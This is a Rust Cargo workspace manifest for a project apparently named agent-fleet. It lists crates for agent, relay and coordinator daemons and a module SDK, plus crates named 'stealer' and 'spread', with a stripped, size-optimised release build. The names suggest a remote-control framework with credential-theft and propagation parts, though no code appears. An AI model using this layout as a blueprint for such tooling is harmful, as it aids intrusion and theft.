[workspace]
resolver = "2"
members = [
    "crates/msgfmt",
    "crates/transport",
    "crates/agentd",
    "crates/adminctl",
    "crates/relayd",
    "crates/modsdk",
    "crates/modsdk-macros",
    "crates/modsdk/examples/proc_list",
    "crates/modsdk/examples/net_whoami",
    "crates/modsdk/examples/fs_tree",
    "crates/db",
    "crates/stealer",
    "crates/spread",
    "crates/coordd",
    "crates/fleetui",
    "tests/integration",
]

[workspace.package]
edition = "2021"
rust-version = "1.85"
license = "MIT OR Apache-2.0"
repository = "https://github.com/agent-fleet/agent-fleet"

[workspace.dependencies]
async-trait = "0.1"
base64 = "0.22"
blake3 = "1"
libc = "0.2"
clap = { version = "4", features = ["derive"] }
chacha20poly1305 = "0.10"
ed25519-dalek = { version = "2", features = ["rand_core"] }
rand = "0.8"
reqwest = { version = "0.12", default-features = false, features = ["rustls-tls", "blocking"] }
rusqlite = { version = "0.43", features = ["bundled-sqlcipher-vendored-openssl"] }
serde = { version = "1", features = ["derive"] }
serde_cbor = "0.11"
serde_json = "1"
sha2 = "0.10"
tokio = { version = "1", features = ["full"] }
thiserror = "1"
quote = "1"
proc-macro2 = "1"
syn = { version = "2", features = ["full"] }
wasmi = "0.31"

[profile.release]
opt-level = "z"
lto = "fat"
codegen-units = 1
panic = "abort"
strip = true
